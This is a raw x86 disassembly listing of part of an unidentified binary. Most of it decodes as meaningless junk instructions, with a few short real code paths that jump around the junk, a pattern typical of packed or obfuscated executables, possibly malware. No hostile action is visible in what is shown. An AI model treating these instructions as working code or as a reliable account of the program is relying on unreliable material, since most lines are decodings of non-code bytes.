  40bdf4:	shl    BYTE PTR [eax-0x6f],cl
  40bdf7:	mov    al,ds:0x5f85ce57
  40bdfc:	int3   
  40bdfd:	mov    ecx,0xf5ca490e
  40be02:	mov    DWORD PTR [ebp-0x628980b8],esp
  40be08:	stos   DWORD PTR es:[edi],eax
  40be09:	leave  
  40be0a:	out    dx,al
  40be0b:	test   eax,0x23c817ed
  40be10:	pop    esp
  40be11:	icebp  
  40be12:	out    dx,al
  40be13:	int3   
  40be14:	mov    ecx,eax
  40be16:	sbb    DWORD PTR [edi],edx
  40be18:	enter  0xe037,0xa8
  40be1c:	add    al,0xf0
  40be1e:	pop    edx
  40be1f:	jmp    0x40bdf4
  40be21:	in     al,0x64
  40be23:	jle    0x40be25
  40be25:	adc    eax,DWORD PTR [ecx]
  40be27:	push   ss
  40be28:	sbb    eax,0x89f21b41
  40be2d:	jno    0x40bdb3
  40be2f:	push   0xe9ae1241
  40be34:	adc    BYTE PTR [ebx+0x15],bl
  40be37:	xor    ebp,DWORD PTR [edx+0x7a8b8192]
  40be3d:	fld    TBYTE PTR [edi]
  40be3f:	add    edi,DWORD PTR [edx-0x34]
  40be42:	int    0x9f
  40be44:	mov    ds:0x922e467a,eax
  40be49:	scas   al,BYTE PTR es:[edi]
  40be4a:	imul   ecx,DWORD PTR [edx-0x7ec8fc00],0x432cde25
  40be54:	add    BYTE PTR [eax],al
  40be56:	es inc ebx
  40be58:	add    BYTE PTR [edi+eax*2],dh
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432cd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434321
  40be7a:	xor    edx,DWORD PTR ds:0x434319
  40be80:	mov    DWORD PTR ds:0x434321,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434321,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434321
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434321,ecx
  40beb3:	cmp    DWORD PTR ds:0x434321,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432749
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432c1a
  40bed6:	cmp    DWORD PTR ds:0x434321,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     dh,BYTE PTR [esi-0x78]
  40bef9:	cmp    DWORD PTR [edi+0x7070fc7b],esi
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	sbb    al,0x6
  40bf05:	inc    ecx
  40bf06:	push   ecx
  40bf07:	aad    0xa7
  40bf09:	test   DWORD PTR [ebx],edi
  40bf0b:	mov    dh,BYTE PTR [ebx+0x65d89f00]
  40bf11:	out    dx,al
  40bf12:	mov    esp,0x3099959a
  40bf17:	push   0xffffffb3
  40bf19:	pop    esp
  40bf1a:	jmp    0x40bef5
  40bf1c:	lahf   
  40bf1d:	push   esi
  40bf1e:	scas   eax,DWORD PTR es:[edi]
  40bf1f:	inc    ebp
  40bf20:	hlt    
  40bf21:	cmp    al,0xfe
  40bf23:	mov    bh,0xb6
  40bf25:	ja     0x40bf57
  40bf27:	xchg   edx,eax
  40bf28:	mov    dh,0xc2
  40bf2a:	dec    esi
  40bf2b:	icebp  
  40bf2c:	je     0x40bf56
  40bf2e:	xchg   BYTE PTR [ebp+0x6e1694e0],al
  40bf34:	inc    esi
  40bf35:	not    DWORD PTR [eax-0x6]
  40bf38:	push   0x2d
  40bf3a:	xlat   BYTE PTR ds:[ebx]
  40bf3b:	jmp    0xa7973c40
  40bf40:	xchg   ecx,eax
  40bf41:	fs adc al,0xd8
  40bf44:	mov    bl,0x43
  40bf46:	mov    dl,0xff
  40bf48:	leave  
  40bf49:	mov    edx,0xd19491e
  40bf4e:	or     eax,eax
  40bf50:	mov    bh,0xed
  40bf52:	push   esi
  40bf53:	sbb    bh,BYTE PTR [edx+eax*8+0x2a]
  40bf57:	add    esp,DWORD PTR [edx+0x5d]
  40bf5a:	cmp    cl,BYTE PTR ds:0xec8499ee
  40bf60:	dec    eax
  40bf61:	inc    edi
  40bf62:	(bad)  
  40bf64:	jns    0x40bf4e
  40bf66:	push   0xffffffb4
  40bf68:	adc    eax,0x71e7deb3
  40bf6d:	scas   al,BYTE PTR es:[edi]
  40bf6e:	cmp    eax,0xffffffe7
  40bf71:	sbb    ecx,ebx
  40bf73:	jno    0x40bf2e
  40bf75:	jb     0x40bf50
  40bf77:	aas    
  40bf78:	push   0xc6bad106
  40bf7d:	jmp    0x28d8409e
  40bf82:	cld    
  40bf83:	add    eax,0xdf7c4a71
  40bf88:	iret   
  40bf89:	fst    DWORD PTR [esi+0x2c]
  40bf8c:	(bad)  
  40bf8d:	sbb    ah,BYTE PTR [esp+ecx*8]
  40bf90:	(bad)  
  40bf91:	mov    ebx,0x56a6188a
  40bf96:	leave  
  40bf97:	jge    0x40bf9c
  40bf99:	daa    
  40bf9a:	xchg   esi,ebp
  40bf9c:	out    0x12,al
  40bf9e:	(bad)  
  40bf9f:	scas   al,BYTE PTR es:[edi]
  40bfa0:	cs loop 0x40c01e
  40bfa3:	mov    ch,0xc5
  40bfa5:	test   BYTE PTR [esi],dl
  40bfa7:	sub    ch,BYTE PTR [ebx]
  40bfa9:	jg     0x40bfae
  40bfab:	(bad)  
  40bfac:	stos   DWORD PTR es:[edi],eax
  40bfad:	imul   esi,DWORD PTR [ebp+0x5a],0x57
  40bfb1:	add    al,bl
  40bfb3:	cwde   
  40bfb4:	aad    0xbb
  40bfb6:	mov    ah,0xe
  40bfb8:	xor    DWORD PTR [eax-0x63553d05],edi
  40bfbe:	in     eax,dx
  40bfbf:	mov    BYTE PTR [edx-0x194a5c5f],cl
  40bfc5:	jne    0x40bfb3
  40bfc7:	mov    DWORD PTR [eax+0x6fff9bb6],edx
  40bfcd:	outs   dx,DWORD PTR ds:[esi]
  40bfce:	je     0x40bf72
  40bfd0:	(bad)  
  40bfd1:	dec    ebx
  40bfd2:	clc    
  40bfd3:	fs ret 
  40bfd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfd6:	stos   BYTE PTR es:[edi],al
  40bfd7:	push   esi
  40bfd8:	adc    DWORD PTR [ecx],esp
  40bfda:	lock es mov esp,0x9e0acabd
  40bfe1:	fbstp  TBYTE PTR [ecx]
  40bfe3:	and    al,0xd9
  40bfe5:	scas   eax,DWORD PTR es:[edi]
  40bfe6:	pop    ebp
  40bfe7:	xchg   edx,eax
  40bfe8:	bound  esi,QWORD PTR [ecx+0x178a806d]
  40bfee:	cmp    al,0xc2
  40bff0:	or     al,0x52
  40bff2:	hlt    
  40bff3:	outs   dx,BYTE PTR ds:[esi]
  40bff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff5:	mov    ds:0x783c049f,al
  40bffa:	push   0xca54248d
  40bfff:	dec    ebp
  40c000:	push   esi
  40c001:	cmp    DWORD PTR [esp+ebp*2],eax
  40c004:	xor    BYTE PTR [ebx+ecx*2+0x37],0x41
  40c009:	and    eax,DWORD PTR [ecx]
  40c00b:	sub    BYTE PTR [edx+0x74],ch
  40c00e:	stc    
  40c00f:	lea    edi,[eax+0x8]
  40c012:	cld    
  40c013:	and    eax,0xc67f13ff
  40c018:	pop    edx
  40c019:	das    
  40c01a:	iret   
  40c01b:	enter  0x7a3c,0x2a
  40c01f:	inc    ebx
  40c020:	mov    ebp,0xcd18ea3c
  40c025:	test   eax,0xbc576cbd
  40c02a:	enter  0x3d95,0x2a
  40c02e:	inc    ebx
  40c02f:	lea    edi,[ecx]
  40c031:	iret   
  40c032:	and    eax,DWORD PTR [edx+ebp*8]
  40c035:	pop    edi
  40c036:	adc    esi,DWORD PTR [esi+0x79]
  40c039:	or     BYTE PTR [ebp-0x1b1010ab],al
  40c03f:	jnp    0x40c0b3
  40c041:	and    eax,0xcf989ed5
  40c046:	(bad)  
  40c047:	ins    DWORD PTR es:[edi],dx
  40c048:	mov    DWORD PTR [esi+0x2f],ebp
  40c04b:	adc    ebp,DWORD PTR [esi+0x161bbc70]
  40c051:	and    eax,0xee822690
  40c056:	arpl   cx,dx
  40c058:	jae    0x40c055
  40c05a:	mov    esi,?
  40c05c:	push   DWORD PTR ds:0xf15225e3
  40c062:	sti    
  40c063:	mov    ch,0x7a
  40c065:	out    dx,al
  40c066:	cmp    eax,0xd1117b45
  40c06b:	or     al,0x50
  40c06d:	sar    dl,cl
  40c06f:	xchg   esp,eax
  40c070:	loop   0x40c03a
  40c072:	pop    ebp
  40c073:	push   ebx
  40c074:	mov    eax,ds:0xe9185f63
  40c079:	xor    bh,bh
  40c07b:	inc    esi
  40c07c:	push   ss
  40c07d:	jle    0x40c013
  40c07f:	ins    BYTE PTR es:[edi],dx
  40c080:	out    dx,al
  40c081:	test   BYTE PTR ds:0xfe81abe8,dl
  40c087:	aad    0xeb
  40c089:	pop    ebp
  40c08a:	rcr    BYTE PTR [esi+0x1c6ea3b6],cl
  40c090:	inc    esp
  40c091:	int3   
  40c092:	in     al,0xe8
  40c094:	loop   0x40c0c7
  40c096:	jecxz  0x40c115
  40c098:	mov    dh,BYTE PTR [eax-0x7e85054d]
  40c09e:	push   ds
  40c09f:	cld    
  40c0a0:	dec    eax
  40c0a1:	xor    DWORD PTR [ebx-0x21],edx
  40c0a4:	jge    0x40c11f
  40c0a6:	fwait
  40c0a7:	sbb    al,0x85
  40c0a9:	jle    0x40c099
  40c0ab:	sub    DWORD PTR [ecx+esi*4+0x151cfe60],0x10
  40c0b3:	pop    ds
  40c0b4:	sahf   
  40c0b5:	lods   al,BYTE PTR ds:[esi]
  40c0b6:	or     eax,0x929e63e8
  40c0bb:	sti    
  40c0bc:	and    eax,0x1f49649a
  40c0c1:	icebp  
  40c0c2:	push   edi
  40c0c3:	push   0x14d3da09
  40c0c8:	aas    
  40c0c9:	icebp  
  40c0ca:	les    edi,FWORD PTR [eax-0x19769cf6]
  40c0d0:	mov    edi,0x1a193633
  40c0d5:	jecxz  0x40c05e
  40c0d7:	jo     0x40c136
  40c0d9:	xchg   ebp,eax
  40c0da:	jecxz  0x40c09d
  40c0dc:	(bad)  
  40c0dd:	pusha  
  40c0de:	inc    edi
  40c0df:	adc    eax,0x10a6fa3d
  40c0e4:	ds cwde 
  40c0e6:	ds and al,cl
  40c0e9:	mov    bh,BYTE PTR [esi]
  40c0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ed:	jle    0x40c09f
  40c0ef:	imul   ebx,DWORD PTR gs:[edi+0x69],0x40
  40c0f4:	push   edi
  40c0f5:	gs pop edx
  40c0f7:	call   0x76cd40e9
  40c0fc:	sahf   
  40c0fd:	xchg   ecx,eax
  40c0fe:	stos   DWORD PTR es:[edi],eax
  40c0ff:	inc    ebx
  40c100:	inc    esi
  40c101:	mov    esi,DWORD PTR [ebp+0x8]
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1-0x950ac4b],si
  40c11e:	into   
  40c11f:	sub    DWORD PTR [ebp-0x6],edi
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	pop    ss
  40c129:	das    
  40c12a:	cmc    
  40c12b:	xchg   DWORD PTR [edi+0x1d],esp
  40c12e:	fwait
  40c12f:	aam    0x8a
  40c131:	rcr    bh,0x8b
  40c134:	call   0xabea7ff1
  40c139:	sub    eax,0x17a6596f
  40c13e:	push   ebp
  40c13f:	cmp    BYTE PTR [edx+eax*2],al
  40c142:	add    eax,0x3e685d6d
  40c147:	xchg   DWORD PTR [ebx-0x15],edi
  40c14a:	mov    edi,0x32d9a7da
  40c14f:	sbb    esi,edi
  40c151:	and    bh,BYTE PTR [esi]
  40c153:	xor    BYTE PTR [ecx],cl
  40c155:	pushf  
  40c156:	and    cl,cl
  40c158:	jb     0x40c176
  40c15a:	popf   
  40c15b:	mov    esp,edx
  40c15d:	outs   dx,DWORD PTR ds:[esi]
  40c15e:	jmp    0xa90fff3f
  40c163:	ret    0x97a7
  40c166:	pusha  
  40c167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c168:	adc    cl,BYTE PTR [edi+0x25]
  40c16b:	ins    BYTE PTR es:[edi],dx
  40c16c:	shl    ah,cl
  40c16e:	pushf  
  40c16f:	loop   0x40c1aa
  40c171:	xchg   esi,eax
  40c172:	mov    bl,0xdc
  40c174:	sub    bl,BYTE PTR [eax]
  40c176:	push   ebp
  40c177:	imul   ecx,DWORD PTR [esi-0x41a2958e],0xfe017e0f
  40c181:	pop    ss
  40c182:	adc    DWORD PTR [ebx+edi*8+0x54],0x66
  40c187:	adc    BYTE PTR [ebx-0xa],ah
  40c18a:	dec    ebp
  40c18b:	inc    esi
  40c18c:	xor    al,0xa8
  40c18e:	pop    edi
  40c18f:	stc    
  40c190:	in     ax,0x8a
  40c193:	shl    DWORD PTR [edi-0x61],cl
  40c196:	dec    ebx
  40c197:	(bad)  
  40c198:	push   cs
  40c199:	imul   BYTE PTR [esi-0x45cdf50e]
  40c19f:	test   al,0xb7
  40c1a1:	leave  
  40c1a2:	les    ebx,FWORD PTR [eax+0x4b]
  40c1a5:	ins    BYTE PTR es:[edi],dx
  40c1a6:	adc    DWORD PTR [eax],ecx
  40c1a8:	inc    edi
  40c1a9:	stc    
  40c1aa:	xor    eax,0x27628626
  40c1af:	sub    bl,0x9f
  40c1b2:	lahf   
  40c1b3:	pop    ds
  40c1b4:	test   esi,ebp
  40c1b6:	add    al,0x2d
  40c1b8:	mov    edi,0xb5ced278
  40c1bd:	dec    ebx
  40c1be:	out    0xab,eax
  40c1c0:	daa    
  40c1c1:	ret    0xb44b
  40c1c4:	shl    BYTE PTR [eax+0x34c85242],1
  40c1ca:	push   ebp
  40c1cb:	fnstcw WORD PTR [ebx+0x7fd16ff1]
  40c1d1:	stc    
  40c1d2:	test   al,0xfe
  40c1d4:	pop    edi
  40c1d5:	or     BYTE PTR [ebx],dh
  40c1d7:	jnp    0x40c1ae
  40c1d9:	into   
  40c1da:	fnsave ds:0xb0b038d
  40c1e0:	fmul   DWORD PTR [edx+0x3d]
  40c1e3:	(bad)  
  40c1e4:	sub    eax,0x23d8896f
  40c1e9:	and    BYTE PTR [ebp-0x21],ch
  40c1ec:	scas   eax,DWORD PTR es:[edi]
  40c1ed:	retf   0x1fc7
  40c1f0:	adc    BYTE PTR [eax-0x51050991],ch
  40c1f6:	out    dx,eax
  40c1f7:	in     al,0x3f
  40c1f9:	inc    edx
  40c1fa:	jge    0x40c259
  40c1fc:	adc    cl,BYTE PTR ds:0xc2094226
  40c202:	sbb    BYTE PTR [esi+0x39],al
  40c205:	sahf   
  40c206:	shr    DWORD PTR [esi+0x3d60d620],1
  40c20c:	lods   al,BYTE PTR ds:[esi]
  40c20d:	int3   
  40c20e:	push   0x2e
  40c210:	or     al,0x59
  40c212:	sbb    al,0x8d
  40c214:	scas   eax,DWORD PTR es:[edi]
  40c215:	jns    0x40c28d
  40c217:	inc    esi
  40c218:	outs   dx,BYTE PTR ds:[esi]
  40c219:	sar    ebx,1
  40c21b:	ins    DWORD PTR es:[edi],dx
  40c21c:	mov    bh,0x16
  40c21e:	hlt    
  40c21f:	push   esi
  40c220:	repnz or DWORD PTR [edx-0x37],edi
  40c224:	xchg   edi,eax
  40c225:	stos   BYTE PTR es:[edi],al
  40c226:	jge    0x40c1cb
  40c228:	fs (bad) 
  40c22a:	shl    DWORD PTR [eax+eax*4+0x3c44ff5f],cl
  40c231:	icebp  
  40c232:	mov    bh,BYTE PTR [edx-0x5]
  40c235:	in     al,0x2
  40c237:	hlt    
  40c238:	cdq    
  40c239:	call   0xce06:0x7ab46655
  40c240:	sbb    dl,cl
  40c242:	pop    esi
  40c243:	call   DWORD PTR [edi+0x73]
  40c246:	push   ebp
  40c247:	add    esp,DWORD PTR [ebp+0x6f]
  40c24a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c24b:	dec    eax
  40c24c:	mov    ss,WORD PTR [ebx-0x30d80550]
  40c252:	loop   0x40c296
  40c254:	ss (bad) 
  40c256:	mov    ecx,0x3aeb8253
  40c25b:	js     0x40c222
  40c25d:	scas   eax,DWORD PTR es:[edi]
  40c25e:	push   esi
  40c25f:	mov    esp,0x89ca2fad
  40c264:	repnz cmovp esi,DWORD PTR [edx]
  40c268:	retf   
  40c269:	mov    WORD PTR [ecx+0xe],gs
  40c26c:	xchg   DWORD PTR [ecx],edi
  40c26e:	cdq    
  40c26f:	xor    dl,ah
  40c271:	xchg   esi,eax
  40c272:	xlat   BYTE PTR ds:[ebx]
  40c273:	and    eax,0x727b68d
  40c278:	in     al,dx
  40c279:	mov    esi,0xab95e689
  40c27e:	jb     0x40c2e4
  40c280:	jmp    0x522c:0xcf4eb90c
  40c287:	cmp    edi,esp
  40c289:	adc    al,0x87
  40c28b:	xchg   ebp,eax
  40c28c:	paddusw mm1,mm4
  40c28f:	push   edi
  40c290:	call   0xa164124f
  40c295:	mov    cl,0x68
  40c297:	and    edi,0xa02849d3
  40c29d:	pop    ebx
  40c29e:	and    DWORD PTR [eax+0x67414987],ebp
  40c2a4:	push   ss
  40c2a5:	dec    eax
  40c2a6:	out    dx,al
  40c2a7:	je     0x40c2f6
  40c2a9:	sbb    edi,DWORD PTR [eax+0x2c]
  40c2ac:	pop    es
  40c2ad:	adc    esp,DWORD PTR [esi]
  40c2af:	aam    0x1f
  40c2b1:	jp     0x40c271
  40c2b3:	shr    BYTE PTR [ecx-0x68],1
  40c2b6:	fsub   QWORD PTR [ecx]
  40c2b8:	dec    edx
  40c2b9:	cwde   
  40c2ba:	cmp    dh,BYTE PTR [ecx+0x4f6b3522]
  40c2c0:	dec    ebp
  40c2c1:	mov    esp,0x1d2eb23e
  40c2c6:	xchg   BYTE PTR fs:[edx],ah
  40c2c9:	cmp    DWORD PTR [edx],edx
  40c2cb:	add    cl,BYTE PTR [ecx-0x1a]
  40c2ce:	xor    DWORD PTR [esi-0x7a27496f],ebp
  40c2d4:	dec    ecx
  40c2d5:	mov    DWORD PTR [edi+ebx*8+0x64351625],ebp
  40c2dc:	js     0x40c2c2
  40c2de:	stos   BYTE PTR es:[edi],al
  40c2df:	xchg   edx,eax
  40c2e0:	ffreep st(1)
  40c2e2:	push   ds
  40c2e3:	(bad)  [ecx]
  40c2e5:	aas    
  40c2e6:	sbb    ebx,DWORD PTR [ebp-0x52]
  40c2e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ea:	das    
  40c2eb:	and    esi,DWORD PTR [esi+0x9ee9162]
  40c2f1:	sbb    eax,DWORD PTR [edx]
  40c2f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f4:	idiv   DWORD PTR [esi-0x241472ee]
  40c2fa:	jae    0x40c33d
  40c2fc:	imul   eax,DWORD PTR [ebx],0x541cac77
  40c302:	and    cl,BYTE PTR [edx+0x55cab93e]
  40c308:	aas    
  40c309:	icebp  
  40c30a:	jnp    0x40c35d
  40c30c:	sub    edx,DWORD PTR [ecx+0x1e84360c]
  40c312:	sub    dl,al
  40c314:	xor    eax,0x2a93288
  40c319:	jmp    0x40c2e9
  40c31b:	popa   
  40c31c:	dec    ecx
  40c31d:	loope  0x40c33b
  40c31f:	icebp  
  40c320:	jge    0x40c324
  40c322:	into   
  40c323:	ins    BYTE PTR es:[edi],dx
  40c324:	push   cs
  40c325:	mov    cl,0x39
  40c327:	inc    esi
  40c328:	push   esp
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c35b
  40c359:	pusha  
  40c35a:	rol    ch,cl
  40c35c:	jg     0x40c356
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	adc    DWORD PTR [esi+edx*4+0x2e],esp
  40c368:	inc    esi
  40c369:	fldcw  WORD PTR [esi+0x59]
  40c36c:	jp     0x40c3b3
  40c36e:	adc    esi,DWORD PTR [edx-0x3c7ce0d1]
  40c374:	pop    es
  40c375:	mov    ah,0xb6
  40c377:	scas   eax,DWORD PTR es:[edi]
  40c378:	dec    ecx
  40c379:	adc    al,0xf
  40c37b:	push   eax
  40c37c:	pop    esi
  40c37d:	cli    
  40c37e:	data16 loop 0x40c3a1
  40c381:	adc    al,0x1a
  40c383:	mov    WORD PTR [ebx+ebp*4+0x5b5f5ce3],?
  40c38a:	js     0x40c32b
  40c38c:	xor    ch,BYTE PTR [edx+edx*4]
  40c38f:	pop    eax
  40c390:	icebp  
  40c391:	mov    bl,0x33
  40c393:	jb     0xea3ed419
  40c399:	mov    ebx,0xb4adac34
  40c39e:	int    0x63
  40c3a0:	repnz inc edi
  40c3a2:	cs cli 
  40c3a4:	adc    edx,ebp
  40c3a6:	inc    esp
  40c3a7:	mov    ebx,0xf6910c99
  40c3ac:	clc    
  40c3ad:	repnz test DWORD PTR [edi+0x4cd0a31],eax
  40c3b4:	or     ch,BYTE PTR [ebx]
  40c3b6:	jmp    0x79c6:0x59209fdc
  40c3bd:	cmp    BYTE PTR [edx],ah
  40c3bf:	or     eax,DWORD PTR [esi+0x43]
  40c3c2:	sub    edx,DWORD PTR [edi]
  40c3c4:	iret   
  40c3c5:	or     DWORD PTR [ebx+0x1e78eea1],eax
  40c3cb:	es xchg esi,eax
  40c3cd:	mov    ecx,0xc9b9bfb1
  40c3d2:	pop    ds
  40c3d3:	pop    eax
  40c3d4:	add    al,BYTE PTR [eax]
  40c3d6:	nop
  40c3d7:	outs   dx,BYTE PTR ds:[esi]
  40c3d8:	sub    BYTE PTR [ebx-0xa76a101],bl
  40c3de:	pushf  
  40c3df:	mov    bl,0x11
  40c3e1:	ret    
  40c3e2:	daa    
  40c3e3:	mov    edi,gs
  40c3e5:	pushf  
  40c3e6:	ss push es
  40c3e8:	pop    ebp
  40c3e9:	neg    DWORD PTR [edx+0xa]
  40c3ec:	or     DWORD PTR [ebp-0x4744f42c],esp
  40c3f2:	outs   dx,BYTE PTR ds:[esi]
  40c3f3:	mov    esp,0x47a79109
  40c3f8:	sbb    DWORD PTR [esi],esp
  40c3fa:	mov    DWORD PTR [esi+eax*1],ebx
  40c3fd:	retf   0x741f
  40c400:	jo     0x40c388
  40c402:	adc    bl,BYTE PTR [edi-0x2e]
  40c405:	dec    BYTE PTR [eax+0x49]
  40c408:	adc    BYTE PTR [ecx],bh
  40c40a:	stos   BYTE PTR es:[edi],al
  40c40b:	call   0x7c7:0x5c62c73a
  40c412:	xchg   DWORD PTR [ecx],esi
  40c414:	adc    edx,esi
  40c416:	(bad)  
  40c417:	cld    
  40c418:	fsubr  QWORD PTR [esi]
  40c41a:	lds    edx,FWORD PTR [ebx-0x45aa0225]
  40c420:	jecxz  0x40c462
  40c422:	and    al,0x4
  40c424:	dec    esp
  40c425:	adc    edi,DWORD PTR [ebx]
  40c427:	mov    edi,0xcd4c9b43
  40c42c:	jl     0x40c424
  40c42e:	(bad)  
  40c42f:	lds    ebx,FWORD PTR ds:0xe42bc453
  40c435:	aaa    
  40c436:	hlt    
  40c437:	or     cl,BYTE PTR [eax]
  40c439:	mov    ah,0x3
  40c43b:	inc    edx
  40c43c:	in     al,dx
  40c43d:	shl    BYTE PTR [edi+0x2c4a2d8a],cl
  40c443:	loop   0x40c474
  40c445:	addr16 repz pushf 
  40c448:	cmp    eax,0x2a1e770
  40c44d:	(bad)  
  40c44e:	shr    DWORD PTR [ebp+edi*1-0x6d13b872],1
  40c455:	add    eax,esi
  40c457:	pop    edi
  40c458:	or     ebx,DWORD PTR [eax-0x5a]
  40c45b:	jne    0x40c3e2
  40c45d:	repnz call 0x9e2:0x2a109066
  40c465:	das    
  40c466:	test   al,0xa7
  40c468:	cmp    al,BYTE PTR [ebp+0x5af3caa4]
  40c46e:	inc    ebx
  40c46f:	xchg   edi,eax
  40c470:	pop    ebx
  40c471:	or     al,0xbd
  40c473:	ficom  WORD PTR [ebx-0x40885b01]
  40c479:	or     ecx,DWORD PTR [ecx-0x2d]
  40c47c:	pushf  
  40c47d:	mov    bh,0x8a
  40c47f:	mov    al,0x1f
  40c481:	sbb    eax,0x78362a5
  40c486:	pushf  
  40c487:	into   
  40c488:	scas   eax,DWORD PTR es:[edi]
  40c489:	cmp    BYTE PTR [eax+0x14004520],bh
  40c48f:	fisttp WORD PTR [esi+0x3303a04d]
  40c495:	idiv   DWORD PTR [esi-0x409986f1]
  40c49b:	test   ebp,edi
  40c49d:	(bad)  
  40c49e:	in     al,dx
  40c49f:	cli    
  40c4a0:	adc    BYTE PTR [edi+eax*2-0x29],ch
  40c4a4:	jp     0x40c43b
  40c4a6:	jle    0x40c48a
  40c4a8:	mov    dl,0xe9
  40c4aa:	push   esp
  40c4ab:	fdivr  QWORD PTR [edx]
  40c4ad:	iret   
  40c4ae:	ins    BYTE PTR es:[edi],dx
  40c4af:	inc    esi
  40c4b0:	gs jnp 0x40c496
  40c4b3:	repnz scas al,BYTE PTR es:[edi]
  40c4b5:	mov    dh,0x7c
  40c4b7:	retf   0x51ad
  40c4ba:	jle    0x40c44e
  40c4bc:	daa    
  40c4bd:	pop    ebx
  40c4be:	in     al,0x13
  40c4c0:	repnz sbb DWORD PTR [edx],esp
  40c4c3:	out    0xc4,al
  40c4c5:	add    DWORD PTR [esi+0x380c148],ebp
  40c4cb:	and    esi,DWORD PTR [eax-0x75]
  40c4ce:	out    dx,eax
  40c4cf:	cmp    al,0xe4
  40c4d1:	les    ecx,FWORD PTR gs:[ebp+0x61449aa8]
  40c4d8:	push   0x3801ce42
  40c4dd:	or     edx,0x3b113666
  40c4e3:	test   eax,0x6d696e2e
  40c4e8:	sub    cl,BYTE PTR [edi]
  40c4ea:	sbb    esp,DWORD PTR [ebx]
  40c4ec:	dec    esp
  40c4ed:	xor    DWORD PTR [esi+ecx*2-0x213d5d1c],esi
  40c4f4:	jl     0x40c53a
  40c4f6:	enter  0x5d46,0xcc
  40c4fa:	fmul   st(7),st
  40c4fc:	outs   dx,DWORD PTR ds:[esi]
  40c4fd:	jmp    0x4b406def
  40c502:	sub    al,0x64
  40c504:	sbb    eax,0xff36cd04
  40c509:	jae    0x40c571
  40c50b:	ds pop edx
  40c50d:	fs ja  0x40c4ff
  40c510:	ss push eax
  40c512:	inc    edi
  40c513:	add    ecx,DWORD PTR [eax-0x57871d7b]
  40c519:	mov    al,0x7b
  40c51b:	in     al,dx
  40c51c:	mov    ah,0xf4
  40c51e:	xor    DWORD PTR [ebp+0x52642911],ebp
  40c524:	jno    0x40c501
  40c526:	sub    cl,BYTE PTR [edx+ecx*4+0x1b]
  40c52a:	mov    WORD PTR [eax],ss
  40c52c:	aaa    
  40c52d:	mov    al,0x2c
  40c52f:	retf   0x36e0
  40c532:	add    DWORD PTR [edx+ecx*2-0x55dbe876],edi
  40c539:	mov    eax,ebp
  40c53b:	mov    bl,0x7b
  40c53d:	retf   
  40c53e:	outs   dx,DWORD PTR ss:[esi]
  40c540:	push   esp
  40c541:	sbb    DWORD PTR [esp+edx*1+0x50],ebx
  40c545:	pop    esi
  40c546:	repz in ax,dx
  40c549:	push   0x91a78a8
  40c54e:	in     al,dx
  40c54f:	xchg   esp,eax
  40c550:	mov    dh,0xc2
  40c552:	repnz call 0x7332:0x1cb24fd9
  40c55a:	push   es
  40c55b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c55c:	hlt    
  40c55d:	loope  0x40c52c
  40c55f:	daa    
  40c560:	lock jb 0x40c598
  40c563:	push   ebp
  40c564:	or     BYTE PTR [ecx+0x7],dl
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	int    0xf7
  40c57a:	mov    ebp,0x70877125
  40c57f:	jo     0x40c5f3
  40c581:	jg     0x40c5f3
  40c583:	jo     0x40c51c
  40c585:	dec    edx
  40c586:	fild   DWORD PTR [ebx+0x623393f6]
  40c58c:	scas   al,BYTE PTR es:[edi]
  40c58d:	jns    0x40c5dd
  40c58f:	mov    esp,0x540b0659
  40c594:	fild   QWORD PTR [ebp-0x40]
